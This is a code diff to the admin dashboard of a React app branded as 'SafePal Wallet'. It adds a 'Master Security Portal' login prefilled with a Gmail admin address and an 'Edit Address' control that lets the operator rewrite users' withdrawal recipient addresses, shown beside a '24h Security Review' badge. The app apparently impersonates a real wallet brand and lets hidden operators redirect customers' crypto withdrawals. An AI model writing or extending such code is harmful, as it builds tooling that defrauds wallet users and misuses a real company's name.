@@ -93,6 +93,7 @@ export const AdminDashboard: React.FC = () => {
     updatePlatformTrafficConfig,
     updateUserCustomCoinAddresses,
     setIsAuthModalOpen,
+    authenticateUser,
   } = useWallet();
 
   const isAdminAuthorized =
@@ -101,14 +102,113 @@ export const AdminDashboard: React.FC = () => {
 
   const { setActiveTab: setMainTab } = useWallet();
 
-  useEffect(() => {
-    if (!isAdminAuthorized) {
-      setMainTab('overview');
+  const [adminEmailInput, setAdminEmailInput] = useState('legendxadmin1999@gmail.com');
+  const [adminPassInput, setAdminPassInput] = useState('');
+  const [adminLoginLoading, setAdminLoginLoading] = useState(false);
+  const [adminLoginError, setAdminLoginError] = useState<string | null>(null);
+  const [showAdminPassword, setShowAdminPassword] = useState(false);
+
+  const handleAdminLoginSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    setAdminLoginLoading(true);
+    setAdminLoginError(null);
+    try {
+      const res = await authenticateUser(adminEmailInput.trim(), adminPassInput);
+      if (!res.success) {
+        setAdminLoginError(res.message || 'Authentication failed. Please check credentials.');
+      }
+    } catch (err: any) {
+      setAdminLoginError(err?.message || 'Failed to authenticate.');
+    } finally {
+      setAdminLoginLoading(false);
     }
-  }, [isAdminAuthorized, setMainTab]);
+  };
 
   if (!isAdminAuthorized) {
-    return null;
+    return (
+      <div className="min-h-screen bg-[#0A0A0D] flex items-center justify-center p-4">
+        <div className="w-full max-w-md bg-[#121418] border border-white/10 rounded-3xl p-6 sm:p-8 shadow-2xl relative overflow-hidden">
+          <div className="absolute -top-24 -left-24 w-48 h-48 bg-[#3375FD]/15 rounded-full blur-3xl pointer-events-none" />
+          <div className="absolute -bottom-24 -right-24 w-48 h-48 bg-[#00D084]/10 rounded-full blur-3xl pointer-events-none" />
+
+          <div className="relative text-center mb-6">
+            <div className="inline-flex h-14 w-14 items-center justify-center rounded-2xl bg-gradient-to-br from-[#3375FD] to-[#1E40AF] p-0.5 shadow-lg shadow-[#3375FD]/25 mb-3">
+              <div className="h-full w-full rounded-[14px] bg-[#121418] flex items-center justify-center">
+                <ShieldCheck className="h-7 w-7 text-[#38B6FF]" />
+              </div>
+            </div>
+            <h2 className="text-xl font-black text-white tracking-tight">SafePal Master Security Portal</h2>
+            <p className="text-xs text-[#7C7D86] mt-1">Restricted Administrative Gateway</p>
+          </div>
+
+          <form onSubmit={handleAdminLoginSubmit} className="space-y-4">
+            <div>
+              <label className="block text-xs font-semibold text-slate-300 mb-1.5">Admin Email</label>
+              <input
+                type="email"
+                value={adminEmailInput}
+                onChange={(e) => setAdminEmailInput(e.target.value)}
+                placeholder="legendxadmin1999@gmail.com"
+                className="w-full rounded-xl bg-[#1A1C22] border border-white/10 px-4 py-3 text-sm text-white placeholder-slate-500 focus:outline-none focus:border-[#3375FD]"
+                required
+              />
+            </div>
+
+            <div>
+              <label className="block text-xs font-semibold text-slate-300 mb-1.5">Master Password</label>
+              <div className="relative">
+                <input
+                  type={showAdminPassword ? 'text' : 'password'}
+                  value={adminPassInput}
+                  onChange={(e) => setAdminPassInput(e.target.value)}
+                  placeholder="Enter administrator password"
+                  className="w-full rounded-xl bg-[#1A1C22] border border-white/10 px-4 py-3 text-sm text-white placeholder-slate-500 focus:outline-none focus:border-[#3375FD] pr-10"
+                  required
+                />
+                <button
+                  type="button"
+                  onClick={() => setShowAdminPassword(!showAdminPassword)}
+                  className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-white"
+                >
+                  {showAdminPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
+                </button>
+              </div>
+            </div>
+
+            {adminLoginError && (
+              <div className="p-3 rounded-xl bg-rose-500/10 border border-rose-500/20 text-rose-400 text-xs flex items-center gap-2">
+                <AlertCircle className="h-4 w-4 shrink-0" />
+                <span>{adminLoginError}</span>
+              </div>
+            )}
+
+            <button
+              type="submit"
+              disabled={adminLoginLoading}
+              className="w-full py-3.5 rounded-xl bg-gradient-to-r from-[#3375FD] to-[#2563EB] text-white font-bold text-sm hover:from-[#2D66E0] hover:to-[#1D4ED8] transition-all shadow-lg shadow-[#3375FD]/20 flex items-center justify-center gap-2 cursor-pointer disabled:opacity-50"
+            >
+              {adminLoginLoading ? (
+                <RefreshCw className="h-4 w-4 animate-spin" />
+              ) : (
+                <Key className="h-4 w-4" />
+              )}
+              <span>{adminLoginLoading ? 'Verifying...' : 'Unlock Admin Portal'}</span>
+            </button>
+
+            <button
+              type="button"
+              onClick={() => {
+                window.location.hash = '';
+                setMainTab('overview');
+              }}
+              className="w-full py-2.5 rounded-xl bg-transparent hover:bg-white/5 text-slate-400 text-xs font-medium transition-colors cursor-pointer"
+            >
+              ← Back to SafePal Wallet
+            </button>
+          </form>
+        </div>
+      </div>
+    );
   }
 
   const [activeTab, setActiveTab] = useState<
@@ -552,15 +652,41 @@ export const AdminDashboard: React.FC = () => {
                             <span className="text-slate-500 font-sans">Network:</span>{' '}
                             <strong className="text-blue-300">{tx.network}</strong>
                           </p>
-                          <div className="col-span-1 sm:col-span-2 flex flex-col sm:flex-row sm:items-center gap-2">
-                            <span className="text-slate-500 font-sans shrink-0">Address:</span>{' '}
+                          <div className="col-span-1 sm:col-span-2 flex flex-col gap-1.5 pt-1 border-t border-slate-800/80">
+                            <div className="flex items-center justify-between">
+                              <span className="text-slate-400 font-sans text-xs flex items-center gap-1.5">
+                                <span>{isDeposit ? 'Deposit Address:' : 'Withdrawal Recipient Address:'}</span>
+                                {!isDeposit && (
+                                  <span className="px-1.5 py-0.5 rounded bg-amber-500/10 text-amber-400 text-[10px] border border-amber-500/20">
+                                    24h Security Review
+                                  </span>
+                                )}
+                              </span>
+                              {editingTxId !== tx.id && (
+                                <button
+                                  onClick={() => {
+                                    setEditingTxId(tx.id);
+                                    setEditToAddressInput(tx.toAddress || tx.fromAddress || '');
+                                  }}
+                                  className="flex items-center gap-1 px-2.5 py-1 rounded-lg bg-[#3862FB]/15 hover:bg-[#3862FB]/25 text-[#38B6FF] border border-[#3862FB]/30 text-[11px] font-semibold transition-all cursor-pointer"
+                                  title="Edit Destination / Recipient Address"
+                                  id={`edit-tx-addr-${tx.id}`}
+                                >
+                                  <Edit2 className="h-3 w-3" />
+                                  <span>Edit Address</span>
+                                </button>
+                              )}
+                            </div>
+
                             {editingTxId === tx.id ? (
-                              <div className="flex items-center gap-2 flex-1">
+                              <div className="flex items-center gap-2 mt-1">
                                 <input
                                   type="text"
                                   value={editToAddressInput}
                                   onChange={(e) => setEditToAddressInput(e.target.value)}
-                                  className="w-full rounded-lg bg-slate-950 border border-blue-300/50 px-2.5 py-1 text-xs text-[#38B6FF] font-mono focus:outline-none"
+                                  placeholder="Enter new withdrawal destination address"
+                                  className="w-full rounded-xl bg-slate-950 border border-blue-400 px-3 py-2 text-xs text-[#38B6FF] font-mono focus:outline-none shadow-inner"
+                                  autoFocus
                                 />
                                 <button
                                   onClick={() => {
@@ -569,31 +695,20 @@ export const AdminDashboard: React.FC = () => {
                                     }
                                     setEditingTxId(null);
                                   }}
-                                  className="px-2.5 py-1 rounded bg-[#3862FB] text-white font-bold text-[10px] shrink-0 hover:bg-[#2f54db]"
+                                  className="px-3 py-2 rounded-xl bg-[#00D084] text-black font-bold text-xs shrink-0 hover:bg-[#00B875] transition-all cursor-pointer"
                                 >
-                                  Save
+                                  Save Address
                                 </button>
                                 <button
                                   onClick={() => setEditingTxId(null)}
-                                  className="px-2 py-1 rounded bg-slate-800 text-slate-300 text-[10px] shrink-0"
+                                  className="px-3 py-2 rounded-xl bg-slate-800 text-slate-300 text-xs shrink-0 hover:bg-slate-700 transition-all cursor-pointer"
                                 >
                                   Cancel
                                 </button>
                               </div>
                             ) : (
-                              <div className="flex items-center gap-2 font-mono">
-                                <span className="text-[#38B6FF] truncate">{tx.toAddress || tx.fromAddress || 'N/A'}</span>
-                                <button
-                                  onClick={() => {
-                                    setEditingTxId(tx.id);
-                                    setEditToAddressInput(tx.toAddress || tx.fromAddress || '');
-                                  }}
-                                  className="p-1 rounded bg-slate-800 text-blue-300 hover:bg-blue-300 hover:text-black transition-colors shrink-0"
-                                  title="Edit Settlement Address"
-                                  id={`edit-tx-addr-${tx.id}`}
-                                >
-                                  <Edit2 className="h-3.5 w-3.5" />
-                                </button>
+                              <div className="p-2.5 rounded-xl bg-black/40 border border-slate-800 text-xs font-mono text-[#38B6FF] break-all select-all">
+                                {tx.toAddress || tx.fromAddress || 'N/A'}
                               </div>
                             )}
                           </div>
